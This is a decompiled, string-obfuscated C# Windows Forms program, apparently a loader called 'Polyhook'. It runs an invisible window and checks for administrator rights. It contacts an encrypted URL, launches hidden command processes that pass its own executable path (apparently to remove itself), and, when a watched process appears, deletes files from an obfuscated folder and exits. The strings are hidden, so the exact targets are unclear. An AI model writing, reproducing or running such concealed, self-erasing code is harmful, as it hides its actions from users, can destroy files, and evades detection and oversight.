using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Windows.Forms;
using _003CPrivateImplementationDetails_003E_007B53EE5BDF_002DC925_002D45D0_002DBB4F_002D1DE255E331E5_007D;
using Bunifu.Framework.UI;
using ns0;

namespace Polyhook;

public class Start : Form
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class2
	{
		public static readonly Class2 class2_0 = new Class2();

		public static Func<FileInfo, bool> func_0;

		internal bool method_0(FileInfo fileInfo_0)
		{
			return fileInfo_0.Extension == F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_373();
		}
	}

	private string string_0;

	private IContainer icontainer_0 = null;

	private BunifuElipse bunifuElipse_0;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	public Start()
	{
		method_0();
	}

	private void Start_Load(object sender, EventArgs e)
	{
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(ntIdentity);
			flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		if (flag)
		{
			timer_2.Start();
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			if (!File.Exists(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_3()))
			{
				Class4.smethod_5();
				Class4.smethod_4();
				try
				{
					WebRequest webRequest = WebRequest.Create(Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_4(), Class7.byte_4, Class7.byte_3));
					webRequest.GetResponse();
				}
				catch
				{
					Process.Start(new ProcessStartInfo
					{
						Arguments = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_5() + Application.get_ExecutablePath() + F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_6(),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						FileName = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_7()
					});
					Environment.Exit(1);
				}
			}
			Class4.smethod_8();
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Class4.smethod_0(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_8(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_9(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_10());
				Class4.smethod_0(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_11(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_12(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_13());
				Class4.smethod_0(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_14(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_15(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_13());
				Class4.smethod_0(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_14(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_16(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_13());
				Class4.smethod_0(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_14(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_17(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_13());
				Class4.smethod_1();
				Class8.smethod_0();
				Class8.smethod_1();
				Class8.smethod_2();
			}
		}
		else
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_5() + Application.get_ExecutablePath() + F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_6(),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_7()
			});
			Environment.Exit(1);
		}
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		string processName = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_18();
		Process process = Process.GetProcessesByName(processName).FirstOrDefault();
		if (process == null)
		{
			return;
		}
		Class5.smethod_0();
		Class4.smethod_9();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_19());
			FileInfo[] array = (from fileInfo_0 in directoryInfo.GetFiles(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_20())
				where fileInfo_0.Extension == F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_373()
				select fileInfo_0).ToArray();
			FileInfo[] array2 = array;
			foreach (FileInfo fileInfo in array2)
			{
				try
				{
					fileInfo.Attributes = FileAttributes.Normal;
					File.Delete(fileInfo.FullName);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		Process.Start(new ProcessStartInfo
		{
			Arguments = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_5() + Application.get_ExecutablePath() + F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_6(),
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_7()
		});
		Process.Start(new ProcessStartInfo
		{
			Arguments = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_5() + string_0 + F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_6(),
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_7()
		});
		Environment.Exit(1);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_0()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		icontainer_0 = new Container();
		bunifuElipse_0 = new BunifuElipse(icontainer_0);
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		timer_2 = new Timer(icontainer_0);
		timer_3 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		bunifuElipse_0.set_ElipseRadius(750);
		bunifuElipse_0.set_TargetControl((Control)(object)this);
		timer_1.set_Enabled(true);
		timer_1.set_Interval(50);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_3.set_Enabled(true);
		timer_3.set_Interval(10000);
		timer_3.add_Tick((EventHandler)timer_3_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(41, 49, 60));
		((Form)this).set_ClientSize(new Size(52, 52));
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_21());
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)1);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Start_Load);
		((Control)this).ResumeLayout(false);
	}
}
